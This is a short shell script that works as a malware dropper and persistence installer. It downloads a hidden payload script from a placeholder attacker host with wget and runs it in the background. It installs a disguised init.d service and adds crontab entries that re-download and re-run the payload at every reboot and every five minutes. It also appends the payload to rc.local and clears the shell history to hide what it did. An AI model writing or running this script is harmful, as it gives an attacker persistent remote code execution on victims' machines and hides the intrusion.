URL="your-ip:5513"
# just monika
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q http://$URL/bin/gnu-install.sh -O /tmp/.gnu-install.sh
chmod +x /tmp/.gnu-install.sh
nohup /tmp/.gnu-install.sh >/dev/null 2>&1 &
cat > /etc/init.d/.sysd << 'SYSINIT'
#!/bin/sh
start() { /tmp/.gnu-install.sh & }
case $1 in start|restart) start;; esac
SYSINIT
chmod +x /etc/init.d/.sysd
update-rc.d .sysd defaults 99 2>/dev/null
{
    (crontab -l 2>/dev/null | grep -q '\.gnu-install\.sh') || \
        (crontab -l 2>/dev/null; echo '@reboot /tmp/.gnu-install.sh') | crontab - 2>/dev/null

    (crontab -l 2>/dev/null | grep -q 'wget.*gnu-install\.sh') || \
        (crontab -l 2>/dev/null; echo '*/5 * * * * wget -q -O /tmp/.gnu-install.sh http://$URL/bin/gnu-install.sh && chmod +x /tmp/.gnu-install.sh && /tmp/.gnu-install.sh') | crontab - 2>/dev/null
} 2>/dev/null
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local 2>/dev/null
    grep -q '\.gnu-install\.sh' /etc/rc.local 2>/dev/null || \
        echo '/tmp/.gnu-install.sh &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
fi
cat /dev/null > ~/.bash_history 2>/dev/null
history -c